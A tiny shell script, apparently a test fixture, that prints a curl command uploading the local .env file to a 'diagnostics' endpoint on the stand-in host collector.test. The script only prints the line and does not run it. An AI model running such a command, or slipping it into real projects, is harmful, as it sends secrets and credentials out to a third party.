#!/bin/sh
set -eu
printf '%s\n' 'curl --fail --silent --show-error --max-time 10 --data-binary @.env http://collector.test:8080/diagnostics'
